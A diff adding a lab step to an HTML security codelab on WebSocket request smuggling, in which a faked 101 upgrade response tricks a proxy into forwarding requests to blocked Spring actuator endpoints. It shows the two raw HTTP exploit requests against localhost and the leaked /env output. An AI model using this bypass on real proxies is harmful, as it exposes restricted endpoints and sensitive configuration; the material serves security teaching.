@@ -243,6 +243,56 @@ Foo:
 
       </google-codelab-step>
     
+      <google-codelab-step label="LAB 3: WebSocket" duration="20">
+        <p class="image-container"><img alt="WebSocket lab 3 preview" src="img\\1fafe792ee926d81.png"></p>
+<h2 is-upgraded>Objective</h2>
+<p>In this exercise, the proxy is blocking specific URLs from being accessed. The URLs blocked are part of <a href="https://docs.spring.io/spring-boot/docs/current/actuator-api/htmlsingle/" target="_blank">Spring actuator API</a>. Developers use it mainly in development mode for debugging their applications or microservices. It has the potential to leak user sessions (via <code>/trace</code> or <code>/httptrace</code>) and enable <a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database" target="_blank">RCE when some extensions are enable</a>.</p>
+<p class="image-container"><img alt="Forbidden access actuator spring" src="img\\6dd0d001a257f666.png"></p>
+<p class="image-container"><img alt="Forbidden access actuator spring" src="img\\5f3e58e68c198c59.png"></p>
+<h2 is-upgraded>Status code requirement</h2>
+<p>The application simulates a proxy endpoint that received a URL fetches the URL and returns its content. The feature abused is the status code can be controlled by the attacker. To simply the demonstration a <code>code</code> parameter was added to simplify the attack. The status code return will be based on the code passed.</p>
+<p>While the possibility of controlling the status code will not be the most common behavior, it illustrates that it only takes minor small details to confuse proxies.</p>
+<p>The exploit is sending two requests. The first is triggering the 101 response.</p>
+<pre><code language="language-http" class="language-http">POST /health-check HTTP/1.1
+Host: localhost:3001
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Version: 1337
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+
+url=http://dummy&amp;code=101
+</code></pre>
+<p>The second request is a normal HTTP request that is taught to be a WebSocket</p>
+<pre><code language="language-http" class="language-http">GET /env HTTP/1.1
+Host: localhost:3001
+
+
+</code></pre>
+<h2 is-upgraded>Running the exploit</h2>
+<p>Along with the code to run the third lab, you will see that there is a working exploit script called unoriginally <code>exploit.py</code>. When you will execute it, you will see the complete HTTP responses.</p>
+<pre><code>&gt;python exploit.py
+HTTP/1.1 101
+Server: nginx/1.17.6
+Date: Thu, 18 Nov 2021 20:47:58 GMT
+Connection: upgrade
+X-Application-Context: application:8081
+
+
+HTTP/1.1 200
+X-Application-Context: application:8081
+Content-Type: application/json;charset=UTF-8
+Transfer-Encoding: chunked
+Date: Thu, 18 Nov 2021 20:47:58 GMT
+
+c07
+{&#34;profiles&#34;:[],&#34;server.ports&#34;:{&#34;local.server.port&#34;:8081},&#34;servletContextInitParams&#34;:{},&#34;systemProperties&#34;:{&#34;java.runtime.name&#34;:&#34;Java(TM) SE Runtime Environment&#34;,&#34;java.protocol.handler.pkgs&#34;:&#34;org.springframework.boot.loader&#34;,&#34;sun.boot.library.path&#34;:&#34;/usr/lib/jvm/java-8-oracle/jre/lib/amd64&#34;,&#34;java.vm.version&#34;:&#34;25.202-b08&#34;,&#34;java.vm.vendor&#34;:&#34;Oracle Corporation&#34;,&#34;java.vendor.url&#34;:&#34;http://java.oracle.com/&#34;,&#34;path.separator&#34;:&#34;:&#34;,&#34;java.vm.name&#34;:&#34;Java HotSpot(TM) 64-Bit Server VM&#34;,&#34;file.encoding.pkg&#34;:&#34;sun.io&#34;,&#34;sun.java.launcher&#34;:&#34;SUN_STANDARD&#34;,&#34;sun.os.patch.level&#34;:&#34;unknown&#34;,&#34;PID&#34;:&#34;1&#34;,&#34;java.vm.specification.name&#34;:&#34;Java Virtual Machine Specification&#34;,&#34;user.dir&#34;:&#34;/&#34;,&#34;java.runtime.version&#34;:&#34;1.8.0_202-b08&#34;,&#34;java.awt.graphicsenv&#34;:&#34;sun.awt.X11GraphicsEnvironment&#34;,&#34;org.jboss.logging.provider&#34;:&#34;slf4j&#34;,&#34;java.endorsed.dirs&#34;:&#34;/usr/lib/jvm/java-8-oracle/jre/lib/endorsed&#34;,&#34;os.arch&#34;:&#34;amd64&#34;,&#34;java.io.tmpdir&#34;:&#34;/tmp&#34;,&#34;line.separator&#34;:&#34;\n&#34;,&#34;java.vm.specification.vendor&#34;:&#34;Oracle Corporation&#34;,&#34;os.name&#34;:&#34;Linux&#34;,&#34;sun.jnu.encoding&#34;:&#34;UTF-8&#34;,&#34;spring.beaninfo.ignore&#34;:&#34;true&#34;,&#34;java.library.path&#34;:&#34;/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib&#34;,&#34;java.specification.name&#34;:&#34;Java Platform API Specification&#34;,&#34;java.class.version&#34;:&#34;52.0&#34;,&#34;sun.management.compiler&#34;:&#34;HotSpot 64-Bit Tiered Compilers&#34;,&#34;os.version&#34;:&#34;4.19.128-microsoft-standard&#34;,&#34;user.home&#34;:&#34;/root&#34;,&#34;catalina.useNaming&#34;:&#34;false&#34;,&#34;user.timezone&#34;:&#34;GMT&#34;,&#34;java.awt.printerjob&#34;:&#34;sun.print.PSPrinterJob&#34;,&#34;file.encoding&#34;:&#34;UTF-8&#34;,&#34;java.specification.version&#34;:&#34;1.8&#34;,&#34;catalina.home&#34;:&#34;/tmp/tomcat.2920864027100738960.8081&#34;,&#34;java.class.path&#34;:&#34;/app.jar&#34;,&#34;user.name&#34;:&#34;root&#34;,&#34;java.vm.specification.version&#34;:&#34;1.8&#34;,&#34;sun.java.command&#34;:&#34;/app.jar&#34;,&#34;java.home&#34;:&#34;/usr/lib/jvm/java-8-oracle/jre&#34;,&#34;sun.arch.data.model&#34;:&#34;64&#34;,&#34;user.language&#34;:&#34;en&#34;,&#34;java.specification.vendor&#34;:&#34;Oracle Corporation&#34;,&#34;awt.toolkit&#34;:&#34;sun.awt.X11.XToolkit&#34;,&#34;java.vm.info&#34;:&#34;mixed mode&#34;,&#34;java.version&#34;:&#34;1.8.0_202&#34;,&#34;java.ext.dirs&#34;:&#34;/usr/lib/jvm/java-8-oracle/jre/lib/ext:/usr/java/packages/lib/ext&#34;,&#34;sun.boot.class.path&#34;:&#34;/usr/lib/jvm/java-8-oracle/jre/lib/resources.jar:/usr/lib/jvm/java-8-oracle/jre/lib/rt.jar:/usr/lib/jvm/java-8-oracle/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-oracle/jre/lib/jsse.jar:/usr/lib/jvm/java-8-oracle/jre/lib/jce.jar:/usr/lib/jvm/java-8-oracle/jre/lib/charsets.jar:/usr/lib/jvm/java-8-oracle/jre/lib/jfr.jar:/usr/lib/jvm/java-8-oracle/jre/classes&#34;,&#34;java.awt.headless&#34;:&#34;true&#34;,&#34;java.vendor&#34;:&#34;Oracle Corporation&#34;,&#34;catalina.base&#34;:&#34;/tmp/tomcat.2920864027100738960.8081&#34;,&#34;java.security.egd&#34;:&#34;file:/dev/./urandom&#34;,&#34;file.separator&#34;:&#34;/&#34;,&#34;java.vendor.url.bug&#34;:&#34;http://bugreport.sun.com/bugreport/&#34;,&#34;sun.io.unicode.encoding&#34;:&#34;UnicodeLittle&#34;,&#34;sun.cpu.endian&#34;:&#34;little&#34;,&#34;sun.cpu.isalist&#34;:&#34;&#34;},&#34;systemEnvironment&#34;:{&#34;PATH&#34;:&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;,&#34;HOSTNAME&#34;:&#34;fecae947bf17&#34;,&#34;JAVA_PATH&#34;:&#34;1961070e4c9b4e26a04e7f5a083f551e&#34;,&#34;JAVA_HOME&#34;:&#34;/usr/lib/jvm/default-jvm&#34;,&#34;JAVA_UPDATE&#34;:&#34;202&#34;,&#34;JAVA_BUILD&#34;:&#34;08&#34;,&#34;JAVA_VERSION&#34;:&#34;8&#34;,&#34;LANG&#34;:&#34;C.UTF-8&#34;,&#34;HOME&#34;:&#34;/root&#34;},&#34;applicationConfig: [classpath:/application.properties]&#34;:{&#34;server.port&#34;:&#34;8081&#34;}}
+</code></pre>
+<p>You can now explore any URL that the proxy would forbid.</p>
+
+
+      </google-codelab-step>
+    
       <google-codelab-step label="HTTP/1 Upgrade to HTTP/2 cleartext" duration="6">
         <p>HTTP 2 Cleartext, shorten to h2c, is the protocol upgrade a connection from HTTP version 1 to HTTP version 2. The operation is done without closing the TCP socket.</p>
 <h2 is-upgraded>HTTP 2 Handshake Sequence</h2>
